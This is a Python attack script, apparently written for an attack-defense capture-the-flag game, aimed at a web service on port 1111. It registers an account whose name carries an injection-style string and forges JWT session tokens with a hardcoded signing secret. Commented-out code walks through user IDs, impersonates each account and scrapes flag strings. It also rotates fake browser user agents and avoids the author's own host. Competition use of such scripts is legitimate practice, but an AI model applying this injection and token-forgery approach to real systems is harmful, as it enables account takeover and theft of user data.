#!/usr/bin/env python3

import requests
import sys
import re
import random
import json
import hashlib
import jwt

user_agents = '''Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'''.split('\n')
current_headers = {'User-Agent': random.choice(user_agents)}

flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')

our_host = "192.168.10.2"		# define out host
port = 1111 					# define port of service

alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
# printable = string.printable

# POST requests
# data = { 'key':'value', 'key1':'value1' }
# res = requests.post( host + "some-url", data=data )

def md5(data): return hashlib.md5(data).hexdigest()
def sha1(data): return hashlib.sha1(data).hexdigest()
def sha256(data): return hashlib.sha256(data).hexdigest()


def main():

	# do not forgot about strip(), split(), replace() - functions to parsing
	u_name = "a or username = test"
	u_pswd = idgen(12)

	# print(u_name, u_pswd)

	register(u_name, u_pswd)
	sess = login(u_name, u_pswd)
	print(jwt.encode({"login": u_name}, "9a9e68aafc2f893efe9d4f4dfe94360d", algorithm="HS256"))

	# group = sess.post(url, data={
	# 	"groupName":f"Group of {u_name}",
	# 	"groupDescription":"Hello world!",
	# 	"isPublic":"on"
	# }).text
	# userId = int(re.findall("<a href=\"/user/(\d+)\"> "+u_name+" </a>", group)[0])
	# print(userId)
	
	# for i in range(userId - 60, userId):
	# 	target_info = sess.get(url+f"/user/{i}").text
	# 	target_name = re.findall("                  (.*) -  Simple account", target_info)[0]

	# 	token = jwt.encode({"login": target_name}, "9a9e68aafc2f893efe9d4f4dfe94360d", algorithm="HS256")
	# 	target_info = requests.get(url+f"/user/{i}", cookies={"Cookies":token}).text
	# 	flags = flagRegEx.findall( target_info )
	# 	if flags:
	# 		print(*flags, sep="\n", flush=True)
	# 		sys.stdout.flush() 	# after print


def idgen( size = 8, chars=alph ):
	return ''.join( random.choice( chars ) for _ in range( size ) )


def register(u_name: str, u_pswd: str):
	resp = requests.post(url+"/register",
		headers=current_headers,
		files={
			'inputName': (None, u_name),
			'inputPassword': (None, u_pswd),
			'inputConfirmPassword': (None, u_pswd),
		}
	).text


def login(u_name: str, u_pswd: str):
	s = requests.Session()
	s.headers.update(current_headers)
	resp = s.post(url+"/login", files={
		'inputName': (None, u_name),#'text/plain'),
		'inputPassword': (None, u_pswd),#'text/plain'),
	}).text
	return s


def get_logins(s):
	logins = []
	for i in range(1, 17):
		resp = s.get(url+f"specific.html?img={str(i).zfill(2)}")
		logins += re.findall('<div class="title h5" style="margin: 20px"><b>(.*)</b></div>', resp.text)
	return logins


if __name__ == '__main__':
	
	if len(sys.argv) > 1:
		host = sys.argv[1]
		url = f'http://{host}:{port}'
	else:
		print(f"Usage: python3 {sys.argv[0]} <host>")
		sys.exit(-1)
	
	if host == our_host:
		sys.exit(-4)
	
	main()